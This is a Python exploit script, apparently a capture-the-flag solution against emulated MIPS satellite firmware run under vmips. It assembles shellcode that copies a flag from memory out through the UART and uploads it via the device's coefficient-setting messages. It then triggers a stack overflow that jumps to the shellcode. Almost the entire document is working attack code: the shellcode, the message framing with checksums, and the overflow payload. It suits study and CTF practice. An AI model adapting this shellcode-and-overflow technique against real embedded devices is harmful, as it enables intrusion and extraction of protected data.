#!/usr/bin/env python3
from keystone import Ks, KS_ARCH_MIPS, KS_MODE_32, KS_MODE_LITTLE_ENDIAN
from pwn import *


SERVER = 'elite-poet.satellitesabove.me'
PORT = 5012
TICKET = b'ticket{sierra227884charlie2:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}'

#context.log_level = 'debug'


# Shellcode cannot have any 64-bit groups of the patterns:
#   8....... ........   (negative float64)
#   7ff..... ........   (NaN/inf float64)
#
# This can be avoided by padding with nops as needed.
# If shellcode acts strangely, kill vmips with `kill -QUIT $(pidof vmips)` and
# run `hexdump -C memdump.bin` to see where data stopped being written.
# You can probably just add a nop after the last instruction you can decode
# starting at offset 0x00180590.
#
# Shellcode is also limited to 0x70 bytes (28 instructions).
# The need for nop padding (and the fact that keystone seems to unconditionally
# add nops in branch delay slots) may make this annoying to deal with.


# Copy data like the timer handler does at 0xbfc056f4
# Wait for the CTL register to become non-1, then memcpy and write 0.
#
# s0 = memcpy       = 0xbfc04078
# s1 = UART_CTL     = 0xa3000020
# s2 = UART_DATA    = 0xa3000024
# s3 = FLAG_BEGIN   = 0xa2008000
# s4 = FLAG_END     = 0xa2008100
# s5 = #1
# s6 = src
CODE = """
    lui     $t0, 0xbfc0
    addiu   $s0, $t0, 0x4078
    lui     $t0, 0xa300
    addiu   $s1, $t0, 0x0020
    addiu   $s2, $t0, 0x0024
    lui     $t0, 0xa200
    addiu   $s3, $t0, 0x8000
    addiu   $s4, $t0, 0x8100
    addi    $s5, $0, 1

    addu    $s6, $s3, $zero
loop:
    lw      $t0, ($s1)
    nop
    beq     $t0, $s5, loop

    addu    $a0, $s2, $zero
    addu    $a1, $s6, $zero
    addiu   $a2, $zero, 16
    addu    $s6, $s6, $a2

    jal     $s0
    sw      $s5, ($s1)
    bne     $s6, $s4, loop

    break
"""

ks = Ks(KS_ARCH_MIPS, KS_MODE_LITTLE_ENDIAN | KS_MODE_32)
shellcode = bytes(ks.asm(CODE)[0])


def checksum(payload):
    return 0xff - (sum(payload) & 0xff)


def make_msg(payload):
    if len(payload) > 0x3d:
        raise Exception('message length ({}) cannot exceed 0x3d bytes'
                        .format(len(payload)))
    pad = b'\x00' * (0x40 - len(payload) - 3)
    checksum = bytes([0xff - (sum(payload) & 0xff)])
    msg = b'\xa5\x5a' + payload + checksum + pad
    return msg


# http://www.dgate.org/vmips/doc/vmips.html#Debugging
argv = [
    './files/vmips',
    '-o', 'fpu',
    '-o', 'memsize=3000000',
    '-o', 'haltdumpcpu',
    '-o', 'excmsg',
    '-o', 'memdump',
    './files/firmware.rom',
]
r = process(argv, stderr=open('stderr.log', 'w'))

"""
r = remote(SERVER, PORT)
r.recvuntil('Ticket please:\n')
r.send(TICKET + b'\n')
"""

# Wait until we receive some data from the device
log.info('Waiting for device')
r.recv(16)

# Disable timer interrupts to avoid more data coming
log.info('Stopping data flow')
r.send(make_msg(b'\x20'))
r.clean(2);

# Upload shellcode to 0xa0180590 with "set coefficients" functionality
log.info('Uploading shellcode')
r.send(make_msg(b'\x30\xaa' + shellcode[:0x38]))
r.send(make_msg(b'\x31\xaa' + shellcode[0x38:]))

# Overflow the stack, jumping to our shellcode
log.info('Jumping to shellcode')
r.send(make_msg(b'\x5c\xaa' + b'\x90\x05\x18\xa0' + b'\xff\xff\xff\xff'))

# Grab the fruits of our labors!
data = r.recvall()
flag = data.rstrip(b'\x00').decode('ascii')
log.info('Got flag!')
print(flag)
